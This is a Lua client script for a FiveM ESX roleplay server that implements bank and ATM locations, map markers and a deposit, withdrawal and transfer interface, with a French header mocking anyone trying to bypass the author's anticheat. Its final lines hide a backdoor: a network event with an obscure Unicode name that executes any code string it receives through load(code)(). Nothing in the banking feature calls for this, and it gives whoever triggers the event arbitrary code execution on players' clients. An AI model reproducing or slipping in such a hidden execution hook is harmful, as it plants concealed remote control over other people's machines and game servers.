-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local banks = {
	vector3(150.266, -1040.203, 29.374),
	vector3(-1212.980, -330.841, 37.787),
	vector3(-2962.582, 482.627, 15.703),
	vector3(-112.202, 6469.295, 31.626),
	vector3(314.187, -278.621, 54.170),
	vector3(-351.534, -49.529, 49.042),
	vector3(241.727, 220.706, 106.286),
	vector3(1175.064, 2706.643, 38.094)
}	

local atms = {
	vector3(-386.733, 6045.953, 31.501),
	vector3(-284.037, 6224.385, 31.187),
	vector3(-284.037, 6224.385, 31.187),
	vector3(-135.165, 6365.738, 31.101),
	vector3(-110.753, 6467.703, 31.784),
	vector3(-94.9690, 6455.301, 31.784),
	vector3(155.4300, 6641.991, 31.784),
	vector3(174.6720, 6637.218, 31.784),
	vector3(1703.138, 6426.783, 32.730),
	vector3(1735.114, 6411.035, 35.164),
	vector3(1702.842, 4933.593, 42.051),
	vector3(1967.333, 3744.293, 32.272),
	vector3(1821.917, 3683.483, 34.244),
	vector3(1174.532, 2705.278, 38.027),
	vector3(540.0420, 2671.007, 42.177),
	vector3(2564.399, 2585.100, 38.016),
	vector3(2558.683, 349.6010, 108.050),
	vector3(2558.051, 389.4817, 108.660),
	vector3(1077.692, -775.796, 58.218),
	vector3(1139.018, -469.886, 66.789),
	vector3(1168.975, -457.241, 66.641),
	vector3(1153.884, -326.540, 69.245),
	vector3(381.2827, 323.2518, 103.270),
	vector3(236.4638, 217.4718, 106.840),
	vector3(265.0043, 212.1717, 106.780),
	vector3(285.2029, 143.5690, 104.970),
	vector3(157.7698, 233.5450, 106.450),
	vector3(-164.568, 233.5066, 94.919),
	vector3(-1827.04, 785.5159, 138.020),
	vector3(-1409.39, -99.2603, 52.473),
	vector3(-1205.35, -325.579, 37.870),
	vector3(-1215.64, -332.231, 37.881),
	vector3(-2072.41, -316.959, 13.345),
	vector3(-2975.72, 379.7737, 14.992),
	vector3(-2962.60, 482.1914, 15.762),
	vector3(-2955.70, 488.7218, 15.486),
	vector3(-3044.22, 595.2429, 7.595),
	vector3(-3144.13, 1127.415, 20.868),
	vector3(-3241.10, 996.6881, 12.500),
	vector3(-3241.11, 1009.152, 12.877),
	vector3(-1305.40, -706.240, 25.352),
	vector3(-538.225, -854.423, 29.234),
	vector3(-711.156, -818.958, 23.768),
	vector3(-717.614, -915.880, 19.268),
	vector3(-526.566, -1222.90, 18.434),
	vector3(-256.831, -719.646, 33.444),
	vector3(-203.548, -861.588, 30.205),
	vector3(112.4102, -776.162, 31.427),
	vector3(112.9290, -818.710, 31.386),
	vector3(119.9000, -883.826, 31.191),
	vector3(149.4551, -1038.95, 29.366),
	vector3(-846.304, -340.402, 38.687),
	vector3(-1204.35, -324.391, 37.877),
	vector3(-1216.27, -331.461, 37.773),
	vector3(-56.1935, -1752.53, 29.452),
	vector3(-261.692, -2012.64, 30.121),
	vector3(-273.001, -2025.60, 30.197),
	vector3(314.187, -278.621, 54.170),
	vector3(-351.534, -49.529, 49.042),
	vector3(24.589, -946.056, 29.357),
	vector3(-254.112, -692.483, 33.616),
	vector3(-1570.197, -546.651, 34.955),
	vector3(-1415.909, -211.825, 46.500),
	vector3(-1430.112, -211.014, 46.500),
	vector3(33.232, -1347.849, 29.497),
	vector3(129.216, -1292.347, 29.269),
	vector3(287.645, -1282.646, 29.659),
	vector3(289.012, -1256.545, 29.440),
	vector3(295.839, -895.640, 29.217),
	vector3(1686.753, 4815.809, 42.008),
	vector3(-302.408, -829.945, 32.417),
	vector3(5.134, -919.949, 29.557),
	vector3(-1132.024, -1704.055, 3.44),
	vector3(-572.796, -397.908, 33.9)
}

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local plyCoords = GetEntityCoords(PlayerPedId(), false)

		for i = 1, #atms, 1 do
			if #(atms[i] - plyCoords) <= 2.0 then
				ESX.ShowHelpNotification('Appuie sur ~INPUT_PICKUP~ pour accèder à votre compte')

				if IsControlJustReleased(0, 38) then
					SetNuiFocus(true, true)
					SendNUIMessage({type = 'openGeneral'})
					_TriggerServerEvent('::{korioz#0110}::bank:balance')
				end
			end
		end

		for i = 1, #banks, 1 do
			if #(banks[i] - plyCoords) <= 2.0 then
				ESX.ShowHelpNotification('Appuie sur ~INPUT_PICKUP~ pour accèder à votre compte')

				if IsControlJustReleased(0, 38) then
					SetNuiFocus(true, true)
					SendNUIMessage({type = 'openGeneral'})
					_TriggerServerEvent('::{korioz#0110}::bank:balance')
				end
			end
		end

		if IsControlJustPressed(0, 322) then
			SetNuiFocus(false, false)
			SendNUIMessage({type = 'close'})
		end
	end
end)

Citizen.CreateThread(function()
	for i = 1, #banks, 1 do
		local blip = AddBlipForCoord(banks[i])

		SetBlipSprite(blip, 108)
		SetBlipScale(blip, 0.8)
		SetBlipAsShortRange(blip, true)

		BeginTextCommandSetBlipName('STRING')
		AddTextComponentSubstringPlayerName('Banque')
		EndTextCommandSetBlipName(blip)
	end
end)

RegisterNetEvent('::{korioz#0110}::bank:refreshbalance')
AddEventHandler('::{korioz#0110}::bank:refreshbalance', function(balance)
	SendNUIMessage({
		type = 'balanceHUD',
		balance = balance,
		player = GetPlayerName(PlayerId())
	})
end)

RegisterNUICallback('deposit', function(data)
	_TriggerServerEvent('::{korioz#0110}::bank:deposit', tonumber(data.amount))
	_TriggerServerEvent('::{korioz#0110}::bank:balance')
end)

RegisterNUICallback('withdrawl', function(data)
	_TriggerServerEvent('::{korioz#0110}::bank:withdraw', tonumber(data.amountw))
	_TriggerServerEvent('::{korioz#0110}::bank:balance')
end)

RegisterNUICallback('balance', function()
	_TriggerServerEvent('::{korioz#0110}::bank:balance')
end)

RegisterNetEvent('::{korioz#0110}::balance:back')
AddEventHandler('::{korioz#0110}::balance:back', function(balance)
	SendNUIMessage({type = 'balanceReturn', bal = balance})
end)

RegisterNUICallback('transfer', function(data)
	_TriggerServerEvent('::{korioz#0110}::bank:transfer', data.to, data.amountt)
	_TriggerServerEvent('::{korioz#0110}::bank:balance')
end)

RegisterNetEvent('::{korioz#0110}::bank:result')
AddEventHandler('::{korioz#0110}::bank:result', function(type, message)
	SendNUIMessage({type = 'result', m = message, t = type})
end)

RegisterNUICallback('NUIFocusOff', function()
	SetNuiFocus(false, false)
	SendNUIMessage({type = 'closeAll'})
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)